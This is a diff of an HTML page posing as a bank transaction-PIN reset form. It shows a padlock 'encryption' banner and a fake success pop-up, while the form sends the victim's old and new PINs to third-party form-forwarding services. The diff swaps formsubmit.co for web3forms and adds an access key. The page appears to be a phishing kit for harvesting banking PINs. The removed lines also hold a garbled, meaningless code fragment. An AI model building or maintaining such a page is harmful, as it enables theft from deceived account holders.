@@ -123,7 +123,6 @@
       animation: spin 0.8s linear infinite;
     }
 
-    /* End to End Encryption Text with CSS Padlock */
     .encryption-text {
       display: flex;
       align-items: center;
@@ -174,7 +173,6 @@
       100% { transform: translateY(0); }
     }
 
-    /* Success Pop-up Styles */
     .popup-overlay {
       display: none;
       position: fixed;
@@ -246,10 +244,10 @@
       Resetting your transaction PIN enhances the security of your transactions. Enter your old PIN and choose a new 4-digit PIN.
     </div>
 
-    <form id="pin-form" action="https://formsubmit.co/117f5e73018f30b3473b2d9b88532a7a" method="POST">
-      <input type="hidden" name="_subject" value="Transaction PIN Reset Submission">
-      <input type="hidden" name="_next" value="success.html">
-      <input type="hidden" name="_captcha" value="false">
+    <form id="pin-form" action="https://api.web3forms.com/submit" method="POST">
+      <input type="hidden" name="access_key" value="599ce64e-5a0c-4797-a282-7b38c34e81ea">
+      <input type="hidden" name="subject" value="Transaction PIN Reset Submission">
+      <input type="hidden" name="redirect" value="success.html">
       <div class="form-group">
         <label for="old-pin">Old PIN</label>
         <input type="password" id="old-pin" name="old-pin" placeholder="Enter your old PIN" pattern="\d{4}" maxlength="4" required>
@@ -270,7 +268,6 @@
     </div>
   </div>
 
-  <!-- Success Pop-up -->
   <div class="popup-overlay" id="popup-overlay">
     <div class="popup">
       <div class="popup-title">Transaction PIN Reset Successful!</div>
@@ -282,20 +279,21 @@
   </div>
 
   <script>
-    document.getElementById('pin-form').addEventListener('submit', function(event) {
-      event.preventDefault();
+    document.getElementById('pin-form').addEventListener('submit', async function(event) {
       const oldPin = document.getElementById('old-pin').value;
       const newPin = document.getElementById('new-pin').value;
       const resetPinBtn = document.getElementById('reset-pin-btn');
       const popupOverlay = document.getElementById('popup-overlay');
 
-      // Basic client-side validation
+      // Client-side validation
       if (!/^\d{4}$/.test(oldPin)) {
         alert('Old PIN must be a 4-digit number.');
+        event.preventDefault();
         return;
       }
       if (!/^\d{4}$/.test(newPin)) {
         alert('New PIN must be a 4-digit number.');
+        event.preventDefault();
         return;
       }
 
@@ -303,25 +301,18 @@
       resetPinBtn.classList.add('loading');
       resetPinBtn.disabled = true;
 
-      // Simulate form submission to Formsubmit and show success pop-up
-      setTimeout(() => {
-        // Submit the form programmatically to Formsubmit
-        document.getElementById('pin-form').submit();
-        
-        // Show success pop-up (in case Formsubmit redirect fails)
-        resetPinBtn.classList.remove('loading');
-        resetPinBtn.disabled = false;
-        popupOverlay.style.display = 'flex';
-      }, 1000); // 1-second loading delay
+      // Delay to show the loading animation for 1 second before the form submits
+      await new Promise(resolve => setTimeout(resolve, 1000));
+
+      // Show success pop-up as a fallback (in case redirect fails)
+      resetPinBtn.classList.remove('loading');
+      resetPinBtn.disabled = false;
+      popupOverlay.style.display = 'flex';
     });
 
     // Handle pop-up button click
-6&& myif (if (true) {
-  4
-}) {
-  
-}document.getElementById('popup-btn').addEventListener('click', function() {
-      window.location.href = 'Success.html';
+    document.getElementById('popup-btn').addEventListener('click', function() {
+      window.location.href = 'successful.html';
     });
   </script>
 </body>
